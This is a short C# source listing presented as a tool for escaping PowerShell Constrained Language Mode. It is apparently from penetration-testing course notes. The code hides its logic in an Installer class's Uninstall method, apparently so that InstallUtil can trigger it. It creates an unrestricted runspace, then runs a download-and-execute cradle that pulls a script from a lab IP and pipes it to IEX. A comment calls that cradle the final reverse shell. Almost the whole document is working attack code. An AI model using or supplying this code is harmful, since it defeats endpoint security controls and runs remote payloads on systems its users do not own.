###  **Custom C# Bypass Tool Source Code**

**Goal:** Create a PowerShell runspace that operates in **FullLanguage** mode, regardless of system-wide CLM restrictions.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

/* 
   Project Setup:
   - Target: Console App (.EXE) or Class Library (.DLL)
   - Platform: x64
   - References: System.Management.Automation.dll, System.Configuration.Install.dll
*/

namespace Bypass {
    class Program {
        static void Main(string[] args) {
            // Main method remains empty; the logic is triggered via the Installer class
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer {
        public override void Uninstall(System.Collections.IDictionary savedState) {
            // 1. Define the command to establish the final reverse shell
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.147/PS/run.ps1') | IEX";
            
            // 2. Create a custom runspace
            // This decouples the engine from the restricted powershell.exe host, 
            // causing it to default to FullLanguage mode.
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open(); 
            
            // 3. Execute the payload in the privileged runspace
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd); 
            ps.Invoke(); 
            
            rs.Close(); 
        }
    }
}
```
